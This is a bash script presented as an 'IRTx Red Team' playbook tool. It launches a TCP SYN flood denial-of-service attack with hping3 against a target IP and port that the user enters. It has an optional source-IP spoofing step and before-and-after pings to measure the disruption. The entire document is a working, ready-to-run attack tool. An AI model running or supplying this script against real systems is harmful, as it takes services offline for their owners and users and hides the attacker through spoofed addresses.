#!/bin/bash

# =============================================================
# IRTx Red Team - TCP SYN Flood Attack
# DataBreach | Red Team Playbook
# =============================================================

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "  ███████╗██╗   ██╗███╗   ██╗███████╗██╗      ██████╗  ██████╗ ██████╗ "
echo "  ██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗"
echo "  ███████╗ ╚████╔╝ ██╔██╗ ██║█████╗  ██║     ██║   ██║██║   ██║██║  ██║"
echo "  ╚════██║  ╚██╔╝  ██║╚██╗██║██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║"
echo "  ███████║   ██║   ██║ ╚████║██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝"
echo "  ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ "
echo -e "${CYAN}           IRTx Red Team — TCP SYN Flood Launcher${RESET}"
echo -e "${YELLOW}                      DataBreach${RESET}"
echo ""

# --- Privilege Check ---
if [[ $EUID -ne 0 ]]; then
  echo -e "${RED}[!] Run as root: sudo ./synflood.sh${RESET}"
  exit 1
fi

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${YELLOW}  TCP SYN Flood — Denial of Service via hping3${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# --- Input ---
echo -e "${YELLOW}[?] Enter target IP ${BOLD}(RHOST)${RESET}${YELLOW}:${RESET}"
read -r TARGET

echo ""
echo -e "${YELLOW}[?] Enter target port ${BOLD}(default: 80)${RESET}${YELLOW}:${RESET}"
read -r PORT
PORT=${PORT:-80}

echo ""
echo -e "${YELLOW}[?] How long to run the flood in seconds ${BOLD}(default: 30)${RESET}${YELLOW}:${RESET}"
read -r DURATION
DURATION=${DURATION:-30}

echo ""
echo -e "${YELLOW}[?] Spoof your IP address? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r SPOOF_CHOICE

SPOOF_FLAG=""
FAKE_IP=""
if [[ "$SPOOF_CHOICE" == "y" || "$SPOOF_CHOICE" == "Y" ]]; then
  echo ""
  echo -e "${YELLOW}[?] Enter fake source IP ${BOLD}(e.g. 10.10.10.10)${RESET}${YELLOW}:${RESET}"
  read -r FAKE_IP
  SPOOF_FLAG="-a $FAKE_IP"
  echo -e "${GREEN}[✓] IP spoofing enabled — source will appear as ${BOLD}$FAKE_IP${RESET}"
else
  echo -e "${YELLOW}[~] No spoofing — your real IP will be used.${RESET}"
fi

# --- Pre-attack ping ---
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${YELLOW}[+] Pre-attack connectivity check...${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
ping -c 4 "$TARGET"
echo ""

# --- Confirm ---
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  Confirm Attack Configuration:${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Target IP   :${RESET} ${BOLD}${RED}$TARGET${RESET}"
echo -e "  ${YELLOW}Target Port :${RESET} ${BOLD}${RED}$PORT${RESET}"
echo -e "  ${YELLOW}Duration    :${RESET} ${BOLD}${CYAN}${DURATION}s${RESET}"
if [[ -n "$FAKE_IP" ]]; then
  echo -e "  ${YELLOW}Source IP   :${RESET} ${BOLD}${MAGENTA}$FAKE_IP (spoofed)${RESET}"
else
  echo -e "  ${YELLOW}Source IP   :${RESET} ${BOLD}${YELLOW}Real IP (no spoof)${RESET}"
fi
echo -e "  ${YELLOW}Attack Type :${RESET} TCP SYN Flood"
echo -e "  ${YELLOW}Tool        :${RESET} hping3 --flood"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}[?] Launch attack? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r CONFIRM

if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
  echo ""
  echo -e "${RED}[!] Aborted.${RESET}"
  exit 0
fi

# --- Launch flood ---
echo ""
echo -e "${MAGENTA}[>] Launching SYN flood against ${RED}$TARGET:$PORT${MAGENTA} for ${CYAN}${DURATION}s${MAGENTA}...${RESET}"
echo ""

timeout "$DURATION" hping3 -S --flood -V -p "$PORT" $SPOOF_FLAG "$TARGET"

# --- Post-attack ping ---
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${YELLOW}[+] Post-attack connectivity check...${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
ping -c 4 "$TARGET"

# --- Done ---
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${GREEN}[✓] Attack complete. Compare pre/post ping times above.${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
